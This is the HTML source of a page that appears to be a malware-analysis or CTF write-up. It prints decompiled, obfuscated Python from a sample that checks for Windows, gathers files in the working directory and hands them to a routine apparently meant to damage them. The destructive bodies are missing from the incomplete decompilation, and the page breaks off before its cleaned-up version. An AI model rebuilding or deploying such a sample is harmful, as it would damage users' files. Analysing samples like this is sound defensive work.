+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_shut_up&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">oOoOoOoooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOoOoOoooOoooOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOoOOOoooOoooOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">oOoOoOoooOoooOOO&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">oOoOoOoooOoOoOOO&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOoOoooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">oOoOoOoooOoOoOOO&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOoOoooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">oOoOoOoooOoOoOOO&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOoOoooOoOOOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOoooOoooOoOOOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOoOoooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">oOOOoOoooOoOOOOO&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">oOoooOoooOoOOOOO&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOoOoooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOoOOOoooOoooOOO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oOOOoOoooOoOoOOO&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">oOOOOOOooOoOoOOO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_get_me_a_sandwich&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">oOOOOOOooOoOoOOO&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">should_stacy_shut_up&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iIiIIiIIiiiIIii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">iIiIIiIIiiiIIii&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iIiIIiIIiiiiIii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iIIIIiIIiiiiIii&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stacy_shut_up&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">iIIIIiIIiiiiIii&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iIiIIiIIiiiiIii&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;oOoOoOoooOoOoOOO&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;oOoOoOoOoOoOoOoO&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_stacy_in_the_right_spot&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eEEeeeeeeeEEEEEeeeeE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;win&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eEEeeEEeeeEEEEEeeeeE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">platform&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">platform&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">EEEEeeEeeeEEEEEeeeeE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">True&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">EEEEeeEEEeEEEEEeeeeE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">False&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">eEEeeeeeeeEEEEEeeeeE&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">eEEeeEEeeeEEEEEeeeeE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EEEEeeEeeeEEEEEeeeeE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_dont_stay&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ccCCCCcccCCCccccCCccc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">print&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ccCCCCcccCCCccccCCccc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;MAYBE YOU SHOULD RUN THIS ON WINDOWS?&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_find_it&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Unsupported&lt;/span> &lt;span class="n">opcode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">JUMP_IF_NOT_EXC_MATCH&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbBBbbBBbbbBBBBBBbbbbb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbbBBbbbbbbBBBBbbbbbbB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bbBBbbBBbbbBBBBBBbbbbb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbbBBbBBBbbBBBBbbbbbbB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bbbBBbbbbbbBBBBbbbbbbB&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbbBBBBBbbbBBBBBbbBBbB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bbBBbbBBbbbBBBBBBbbbbb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getcwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbBbbbBbBBbBBBBbbbbbbB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">bbbBBBBBbbbBBBBBbbBBbB&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">bbbBBbBBBbbBBBBbbbbbbB&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">.fi&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbBbbbBbBBbBbbBbbbbbbB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bbbbBBBBbbBBbBBbBBbBbb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;_&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BBbbBBbbbBBbBBbBBbbbbb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># WARNING: Decompyle incomplete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_make_pretty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">zzZZzzzZZZZzzZZZzzZZZZZZ&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzZZZzZZZzzZZZzZZ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzZZZzzzzZZZzzZZZzZZ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzZZZZZZ&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="n">zzZZzzzZZZZzzZZZzzZZZzZZ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzzzzzZZ&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">zzZZzzzzzZZZzZZZzzZZZzZZ&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">zzZZzzZZZzzzzZZZzzZZZzZZ&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzzzzzZZ&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">zzZZzzzzzZZZzZZZzzZZZzZZ&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzZZZzZZ&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzZZZzZZ&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzZZZzZZ&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzZZZzZZZzzZZZzZZ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">zzZZzzzZZZZzzZZZzzzzzzZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reverse&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">zzZZzzzzzzzzzZZZzzZZZzZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">stacy_breaks_shit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">yYYyYyyYyyyyyYYYYYY&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Unsupported&lt;/span> &lt;span class="n">opcode&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RERAISE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># WARNING: Decompyle incomplete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">run_stacy&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">xXXxxXXxXxxXXx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">is_stacy_in_the_right_spot&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">xXXxxXXxXxxXXx&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">xXXxxXXxXXXXXx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_find_it&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sorted_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stacy_make_pretty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">xXXxxXXxXXXXXx&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_stacy_shut_up&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stacy_breaks_shit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_list&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stacy_dont_stay&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQqqQQqqQQqqQQQqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;CiAgICAgIyUlICAgICAgICAgICAgICUlJSAgICAgCiAgICAgJSUlJSUgICAgICAgICAlJSUlJSAgICAgCiAgICAgJSUlJSUlJSAgICAgJSUlJSUlJSAgICAgCiAgICAgJSUlJSUlJSUlICUlJSUlJSUlJSAgICAgCiAgJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSAgCiAlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUgCiAlJSUlJSUlICUlJSUlJSUlJSUlICUlJSUlJSUgCiAlJSUlJSUlJSAgJSUlJSUlJSAgJSUlJSUlJSUgCiAlJSUlJSUlJSUlICAlJSUgICUlJSUlJSUlJSUgCiAlJSUlJSUlJSUgICAgICAgICAlJSUlJSUlJSUgCiAlJSUlJSUlICAgICAgICAgICAgICUlJSUlJSUKIApNYWxjb3JlOiBTaW1wbGUgRmlsZSBBbmFseXNpcw==&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQqqQQqqQQqqqqqqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">print&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQQQQQqqQQqqQQQqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">QQQQqqQQqqQQqqQQQqqQQQ&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">qqQQQQQQqqQQqqQQQqqQQQ&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64decode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">qqQQqqQQqqQQqqqqqqqQQQ&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">QQQQqqQQqqQQqqQQQqqQQQ&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">qqQQqqQQqqQQqqQQQqqQQQ&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">run_stacy&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Again, it is obfuscated. Cleaning the code will make our eyes better.&lt;/p>
+&lt;p>The cleaned code will looks something like below.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
